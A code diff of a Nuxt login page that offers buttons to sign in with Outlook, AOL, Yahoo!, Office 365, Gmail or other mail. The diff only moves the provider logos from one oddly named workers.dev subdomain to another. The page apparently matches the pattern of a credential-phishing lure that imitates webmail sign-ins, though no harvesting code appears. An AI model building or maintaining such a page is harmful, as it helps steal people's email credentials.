@@ -8,42 +8,42 @@
             <section class="links">
                 <NuxtLink to="/login">
                     <button>
-                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
+                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
                         <p>Continue with Outlook</p>
                     </button>
                 </NuxtLink>
 
                 <NuxtLink to="/login">
                     <button>
-                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/aol.png" alt="">
+                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/aol.png" alt="">
                         <p>Continue with AOL</p>
                     </button>
                 </NuxtLink>
 
                 <NuxtLink to="/login">
                     <button>
-                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
+                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
                         <p>Continue with Yahoo!</p>
                     </button>
                 </NuxtLink>
 
                 <NuxtLink to="/login">
                     <button>
-                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
+                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
                         <p>Continue with Office 365</p>
                     </button>
                 </NuxtLink>
 
                 <NuxtLink to="/login">
                     <button>
-                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/gmail.svg" alt="">
+                        <img src="https://www.logo.wine/a/logo/Gmail/Gmail-Logo.wine.svg" alt="">
                         <p>Continue with Gmail</p>
                     </button>
                 </NuxtLink>
 
                 <NuxtLink to="/login">
                     <button>
-                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/mail.png" alt="">
+                        <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/mail.png" alt="">
                         <p>Continue with Other Mail</p>
                     </button>
                 </NuxtLink>
